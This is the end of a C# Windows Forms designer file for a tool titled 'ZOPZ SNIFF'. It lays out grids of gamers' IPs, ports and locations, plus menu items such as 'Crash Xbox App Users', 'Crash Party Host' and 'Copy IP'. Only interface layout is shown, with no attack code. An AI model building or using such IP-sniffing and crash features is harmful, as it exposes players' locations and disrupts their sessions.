            this.Pcdecryption.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.Pcdecryption.ThemeStyle.BackColor = System.Drawing.Color.Black;
            this.Pcdecryption.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.Pcdecryption.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.Pcdecryption.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.Pcdecryption.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Pcdecryption.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.Pcdecryption.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.Pcdecryption.ThemeStyle.HeaderStyle.Height = 20;
            this.Pcdecryption.ThemeStyle.ReadOnly = true;
            this.Pcdecryption.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
            this.Pcdecryption.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.Pcdecryption.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Pcdecryption.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            this.Pcdecryption.ThemeStyle.RowsStyle.Height = 30;
            this.Pcdecryption.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.Pcdecryption.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            // 
            // dataGridViewImageColumn1
            // 
            this.dataGridViewImageColumn1.FillWeight = 20F;
            this.dataGridViewImageColumn1.HeaderText = "";
            this.dataGridViewImageColumn1.MinimumWidth = 6;
            this.dataGridViewImageColumn1.Name = "dataGridViewImageColumn1";
            this.dataGridViewImageColumn1.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn8
            // 
            this.dataGridViewTextBoxColumn8.HeaderText = "Username";
            this.dataGridViewTextBoxColumn8.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn8.Name = "dataGridViewTextBoxColumn8";
            this.dataGridViewTextBoxColumn8.ReadOnly = true;
            this.dataGridViewTextBoxColumn8.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn9
            // 
            this.dataGridViewTextBoxColumn9.HeaderText = "IP Address";
            this.dataGridViewTextBoxColumn9.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn9.Name = "dataGridViewTextBoxColumn9";
            this.dataGridViewTextBoxColumn9.ReadOnly = true;
            this.dataGridViewTextBoxColumn9.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn10
            // 
            this.dataGridViewTextBoxColumn10.FillWeight = 60F;
            this.dataGridViewTextBoxColumn10.HeaderText = "Port";
            this.dataGridViewTextBoxColumn10.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn10.Name = "dataGridViewTextBoxColumn10";
            this.dataGridViewTextBoxColumn10.ReadOnly = true;
            this.dataGridViewTextBoxColumn10.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn11
            // 
            this.dataGridViewTextBoxColumn11.HeaderText = "Country";
            this.dataGridViewTextBoxColumn11.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn11.Name = "dataGridViewTextBoxColumn11";
            this.dataGridViewTextBoxColumn11.ReadOnly = true;
            this.dataGridViewTextBoxColumn11.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn12
            // 
            this.dataGridViewTextBoxColumn12.HeaderText = "Region";
            this.dataGridViewTextBoxColumn12.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn12.Name = "dataGridViewTextBoxColumn12";
            this.dataGridViewTextBoxColumn12.ReadOnly = true;
            this.dataGridViewTextBoxColumn12.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn13
            // 
            this.dataGridViewTextBoxColumn13.HeaderText = "City";
            this.dataGridViewTextBoxColumn13.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn13.Name = "dataGridViewTextBoxColumn13";
            this.dataGridViewTextBoxColumn13.ReadOnly = true;
            this.dataGridViewTextBoxColumn13.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn14
            // 
            this.dataGridViewTextBoxColumn14.FillWeight = 200F;
            this.dataGridViewTextBoxColumn14.HeaderText = "ISP";
            this.dataGridViewTextBoxColumn14.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn14.Name = "dataGridViewTextBoxColumn14";
            this.dataGridViewTextBoxColumn14.ReadOnly = true;
            this.dataGridViewTextBoxColumn14.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // PcContext
            // 
            this.PcContext.BackColor = System.Drawing.Color.Black;
            this.guna2Transition1.SetDecoration(this.PcContext, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.PcContext, Guna.UI2.AnimatorNS.DecorationType.None);
            this.PcContext.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.PcContext.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.PcContext.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.PcContext.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem3,
            this.toolStripMenuItem15,
            this.toolStripMenuItem19,
            this.toolStripMenuItem20,
            this.toolStripMenuItem21,
            this.toolStripMenuItem22});
            this.PcContext.Name = "logInContextMenu2";
            this.PcContext.ShowImageMargin = false;
            this.PcContext.Size = new System.Drawing.Size(186, 148);
            // 
            // toolStripMenuItem3
            // 
            this.toolStripMenuItem3.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem3.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem3.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem3.Name = "toolStripMenuItem3";
            this.toolStripMenuItem3.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem3.Text = "Copy To Clipboard";
            this.toolStripMenuItem3.Click += new System.EventHandler(this.toolStripMenuItem3_Click);
            // 
            // toolStripMenuItem15
            // 
            this.toolStripMenuItem15.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem15.Name = "toolStripMenuItem15";
            this.toolStripMenuItem15.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem15.Text = "Copy Entire Row";
            this.toolStripMenuItem15.Click += new System.EventHandler(this.toolStripMenuItem15_Click_1);
            // 
            // toolStripMenuItem19
            // 
            this.toolStripMenuItem19.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem19.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem19.Name = "toolStripMenuItem19";
            this.toolStripMenuItem19.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem19.Text = "Clear All";
            this.toolStripMenuItem19.Click += new System.EventHandler(this.toolStripMenuItem19_Click);
            // 
            // toolStripMenuItem20
            // 
            this.toolStripMenuItem20.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem20.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem20.Name = "toolStripMenuItem20";
            this.toolStripMenuItem20.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem20.Text = "Clear Selected Row";
            this.toolStripMenuItem20.Click += new System.EventHandler(this.toolStripMenuItem20_Click);
            // 
            // toolStripMenuItem21
            // 
            this.toolStripMenuItem21.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem21.Name = "toolStripMenuItem21";
            this.toolStripMenuItem21.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem21.Text = "Ping Cell";
            this.toolStripMenuItem21.Click += new System.EventHandler(this.toolStripMenuItem21_Click);
            // 
            // toolStripMenuItem22
            // 
            this.toolStripMenuItem22.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem22.Name = "toolStripMenuItem22";
            this.toolStripMenuItem22.Size = new System.Drawing.Size(185, 24);
            this.toolStripMenuItem22.Text = "Packet Analyzer";
            this.toolStripMenuItem22.Click += new System.EventHandler(this.toolStripMenuItem22_Click);
            // 
            // Functions
            // 
            this.Functions.BackColor = System.Drawing.Color.Black;
            this.Functions.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.Ani.SetDecoration(this.Functions, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.Functions, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Functions.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Functions.ImageScalingSize = new System.Drawing.Size(19, 19);
            this.Functions.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.giveAchievementsbetaToolStripMenuItem,
            this.toolStripMenuItem5,
            this.toolStripMenuItem6,
            this.becomeUnkickableToolStripMenuItem,
            this.crashHostToolStripMenuItem,
            this.toolStripMenuItem7,
            this.lockEveryoneInToolStripMenuItem,
            this.invisibleInPartyToolStripMenuItem,
            this.copyIPIfPresentToolStripMenuItem});
            this.Functions.Name = "Functions";
            this.Functions.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.Functions.ShowImageMargin = false;
            this.Functions.Size = new System.Drawing.Size(228, 220);
            // 
            // giveAchievementsbetaToolStripMenuItem
            // 
            this.giveAchievementsbetaToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.giveAchievementsbetaToolStripMenuItem.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.giveAchievementsbetaToolStripMenuItem.ForeColor = System.Drawing.Color.Gray;
            this.giveAchievementsbetaToolStripMenuItem.Name = "giveAchievementsbetaToolStripMenuItem";
            this.giveAchievementsbetaToolStripMenuItem.Size = new System.Drawing.Size(227, 24);
            // 
            // toolStripMenuItem5
            // 
            this.toolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.toolStripMenuItem5.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem5.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem5.Name = "toolStripMenuItem5";
            this.toolStripMenuItem5.Size = new System.Drawing.Size(227, 24);
            this.toolStripMenuItem5.Text = "1) Copy Gamertag";
            this.toolStripMenuItem5.Click += new System.EventHandler(this.toolStripMenuItem5_Click);
            // 
            // toolStripMenuItem6
            // 
            this.toolStripMenuItem6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.toolStripMenuItem6.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem6.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem6.Name = "toolStripMenuItem6";
            this.toolStripMenuItem6.Size = new System.Drawing.Size(227, 24);
            this.toolStripMenuItem6.Text = "2) Crash Xbox App Users";
            this.toolStripMenuItem6.Click += new System.EventHandler(this.toolStripMenuItem6_Click);
            // 
            // becomeUnkickableToolStripMenuItem
            // 
            this.becomeUnkickableToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.becomeUnkickableToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.becomeUnkickableToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.becomeUnkickableToolStripMenuItem.Name = "becomeUnkickableToolStripMenuItem";
            this.becomeUnkickableToolStripMenuItem.Size = new System.Drawing.Size(227, 24);
            this.becomeUnkickableToolStripMenuItem.Text = "3) Become Unkickable";
            this.becomeUnkickableToolStripMenuItem.Click += new System.EventHandler(this.becomeUnkickableToolStripMenuItem_Click);
            // 
            // crashHostToolStripMenuItem
            // 
            this.crashHostToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.crashHostToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.crashHostToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.crashHostToolStripMenuItem.Name = "crashHostToolStripMenuItem";
            this.crashHostToolStripMenuItem.Size = new System.Drawing.Size(227, 24);
            this.crashHostToolStripMenuItem.Text = "4) Crash Party Host";
            this.crashHostToolStripMenuItem.Click += new System.EventHandler(this.crashHostToolStripMenuItem_Click);
            // 
            // toolStripMenuItem7
            // 
            this.toolStripMenuItem7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.toolStripMenuItem7.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.toolStripMenuItem7.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem7.Name = "toolStripMenuItem7";
            this.toolStripMenuItem7.Size = new System.Drawing.Size(227, 24);
            this.toolStripMenuItem7.Text = "5) Copy XUID";
            this.toolStripMenuItem7.Click += new System.EventHandler(this.toolStripMenuItem7_Click);
            // 
            // lockEveryoneInToolStripMenuItem
            // 
            this.lockEveryoneInToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.lockEveryoneInToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.lockEveryoneInToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.lockEveryoneInToolStripMenuItem.Name = "lockEveryoneInToolStripMenuItem";
            this.lockEveryoneInToolStripMenuItem.Size = new System.Drawing.Size(227, 24);
            this.lockEveryoneInToolStripMenuItem.Text = "6) Lock Everyone In";
            this.lockEveryoneInToolStripMenuItem.Click += new System.EventHandler(this.lockEveryoneInToolStripMenuItem_Click);
            // 
            // invisibleInPartyToolStripMenuItem
            // 
            this.invisibleInPartyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.invisibleInPartyToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.invisibleInPartyToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.invisibleInPartyToolStripMenuItem.Name = "invisibleInPartyToolStripMenuItem";
            this.invisibleInPartyToolStripMenuItem.Size = new System.Drawing.Size(227, 24);
            this.invisibleInPartyToolStripMenuItem.Text = "7) Hide Party";
            this.invisibleInPartyToolStripMenuItem.Click += new System.EventHandler(this.invisibleInPartyToolStripMenuItem_Click);
            // 
            // copyIPIfPresentToolStripMenuItem
            // 
            this.copyIPIfPresentToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.copyIPIfPresentToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.copyIPIfPresentToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.copyIPIfPresentToolStripMenuItem.Name = "copyIPIfPresentToolStripMenuItem";
            this.copyIPIfPresentToolStripMenuItem.Size = new System.Drawing.Size(227, 24);
            this.copyIPIfPresentToolStripMenuItem.Text = "8) Copy IP (If Present)";
            this.copyIPIfPresentToolStripMenuItem.Click += new System.EventHandler(this.copyIPIfPresentToolStripMenuItem_Click);
            // 
            // tabPage1
            // 
            this.guna2Transition1.SetDecoration(this.tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.tabPage1.Location = new System.Drawing.Point(0, 0);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Size = new System.Drawing.Size(200, 100);
            this.tabPage1.TabIndex = 0;
            // 
            // Ani
            // 
            this.Ani.Cursor = null;
            animation3.AnimateOnlyDifferences = true;
            animation3.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.BlindCoeff")));
            animation3.LeafCoeff = 0F;
            animation3.MaxTime = 1F;
            animation3.MinTime = 0F;
            animation3.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.MosaicCoeff")));
            animation3.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation3.MosaicShift")));
            animation3.MosaicSize = 0;
            animation3.Padding = new System.Windows.Forms.Padding(0);
            animation3.RotateCoeff = 0F;
            animation3.RotateLimit = 0F;
            animation3.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.ScaleCoeff")));
            animation3.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.SlideCoeff")));
            animation3.TimeCoeff = 0F;
            animation3.TransparencyCoeff = 0F;
            this.Ani.DefaultAnimation = animation3;
            // 
            // backgroundWorker2
            // 
            this.backgroundWorker2.WorkerReportsProgress = true;
            this.backgroundWorker2.DoWork += new System.ComponentModel.DoWorkEventHandler(this.XauthWorker_DoWork);
            this.backgroundWorker2.ProgressChanged += new System.ComponentModel.ProgressChangedEventHandler(this.XauthWorker_ProgressChanged);
            // 
            // timer2
            // 
            this.timer2.Interval = 2000;
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // DragControl_Form
            // 
            this.DragControl_Form.TargetControl = this.panel2;
            // 
            // guna2DragControl1
            // 
            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2DragControl1.TransparentWhileDrag = false;
            // 
            // guna2Elipse3
            // 
            this.guna2Elipse3.BorderRadius = 20;
            // 
            // guna2Elipse12
            // 
            this.guna2Elipse12.BorderRadius = 10;
            this.guna2Elipse12.TargetControl = this.guna2GroupBox3;
            // 
            // Mainform
            // 
            this.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(1097, 605);
            this.ControlBox = false;
            this.Controls.Add(this.guna2Panel1);
            this.Ani.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.ForeColor = System.Drawing.Color.Transparent;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Name = "Mainform";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "ZOPZ SNIFF";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Mainform_FormClosed);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.Shown += new System.EventHandler(this.Mainform_Shown);
            this.Move += new System.EventHandler(this.Mainform_Move);
            this.logInContextMenu2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView2)).EndInit();
            this.logInContextMenu3.ResumeLayout(false);
            this.logInContextMenu6.ResumeLayout(false);
            this.logInContextMenu5.ResumeLayout(false);
            this.logInContextMenu1.ResumeLayout(false);
            this.panel2.ResumeLayout(false);
            this.guna2Panel1.ResumeLayout(false);
            this.panel3.ResumeLayout(false);
            this.guna2TabControl1.ResumeLayout(false);
            this.filteredGamesTab.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).EndInit();
            this.playstationTab.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.guna2DataGridView5)).EndInit();
            this.xboxTab.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.guna2DataGridView4)).EndInit();
            this.otherInfoTab.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.guna2DataGridView3)).EndInit();
            this.xblToolTab.ResumeLayout(false);
            this.guna2GroupBox3.ResumeLayout(false);
            this.guna2Panel4.ResumeLayout(false);
            this.guna2Panel5.ResumeLayout(false);
            this.PcTab.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.Pcdecryption)).EndInit();
            this.PcContext.ResumeLayout(false);
            this.Functions.ResumeLayout(false);
            this.ResumeLayout(false);

	}
}
